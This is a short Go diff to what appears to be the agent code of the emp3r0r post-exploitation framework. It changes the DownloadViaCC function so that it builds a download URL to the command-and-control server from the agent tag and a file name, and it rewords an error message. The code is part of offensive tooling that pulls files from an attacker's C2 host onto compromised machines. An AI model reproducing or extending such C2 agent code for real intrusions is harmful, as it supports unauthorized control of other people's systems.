@@ -5,6 +5,7 @@ import (
 	"encoding/base64"
 	"fmt"
 	"log"
+	"net/url"
 	"os"
 	"time"
 
@@ -43,7 +44,9 @@ func file2CC(filepath string, offset int64) (checksum string, err error) {
 
 // DownloadViaCC download via EmpHTTPClient
 // if path is empty, return []data instead
-func DownloadViaCC(url, path string) (data []byte, err error) {
+func DownloadViaCC(file_to_download, path string) (data []byte, err error) {
+	url := fmt.Sprintf("%s%s/%s?file_to_download=%s",
+		emp3r0r_data.CCAddress, tun.FileAPI, url.QueryEscape(RuntimeConfig.AgentTag), url.QueryEscape(file_to_download))
 	log.Printf("DownloadViaCC is downloading from %s to %s", url, path)
 	retData := false
 	if path == "" {
@@ -71,7 +74,7 @@ func DownloadViaCC(url, path string) (data []byte, err error) {
 		t.Stop()
 		if !retData && !util.IsFileExist(path) {
 			data = nil
-			err = fmt.Errorf("%s not found, download failed", path)
+			err = fmt.Errorf("Target file '%s' does not exist, downloading from CC may have failed", path)
 		}
 	}()
 	for !resp.IsComplete() {
